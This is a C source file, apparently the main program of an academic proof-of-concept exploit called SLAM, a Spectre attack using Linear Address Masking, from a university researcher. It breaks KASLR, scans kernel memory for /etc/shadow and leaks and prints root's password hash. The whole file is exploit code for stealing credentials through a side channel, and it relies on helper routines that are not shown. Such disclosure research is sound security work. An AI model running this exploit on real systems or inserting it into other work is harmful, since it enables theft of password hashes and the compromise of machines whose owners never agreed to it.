/* End-to-end SLAM (Spectre based on Linear Address Masking) exploit leaking
 * root's password hash from /etc/shadow.
 *
 * Date: November 23, 2023
 * Author: Math√© Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

int main(int argc, char **argv)
{
	uint64_t t0 = clock_read();
	set_cpu_affinity(CPU);
	config();
	init_rand();
	timer_init();
	evict_init();
	reload_init();

	kaslr_init();
	pr_info("=====[Break KASLR]=====\n");
	step_start();
	uint64_t direct_map = find_direct_map();
	step_end();

	gadget_init(direct_map);

	pr_info("\n=====[Search /etc/shadow]=====\n");
	step_start();
	uint64_t shadow_addr = leak_addr(direct_map, direct_map+PHYS_MEM_SIZE, PAGE_SIZE, "root:$");
	uint64_t daemon_addr = leak_addr(shadow_addr, shadow_addr+256, 1, "daemon:");
	if (daemon_addr == -1)
		fail("did not find the shadow file");
	step_end();

	pr_info("\n=====[Leak /etc/shadow]=====\n");
	step_start();
	char *root_passwd_hash = leak_data((char *)daemon_addr, daemon_addr % PAGE_SIZE, "daemon:");
	step_end();

	pr_result("\n=====[Password hash of root]=====\n%s=================================\n", root_passwd_hash);

	free(root_passwd_hash);

	float duration = (clock_read() - t0) / 1000000000.0;
	pr_info("Took %.1f seconds in total.\n", duration);

	return 0;
}
